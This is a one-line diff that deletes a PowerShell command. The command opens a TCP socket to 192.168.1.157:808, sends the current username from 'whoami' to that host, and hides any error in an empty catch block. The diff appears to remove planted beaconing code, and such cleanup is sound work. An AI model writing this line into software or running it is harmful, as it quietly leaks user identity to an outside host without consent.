@@ -1,1 +1,0 @@
-try{($c=New-Object Net.Sockets.TcpClient('192.168.1.157',808)).GetStream().Write(([Text.Encoding]::UTF8.GetBytes($(whoami))),0, $(whoami).Length);$c.Close()}catch{}
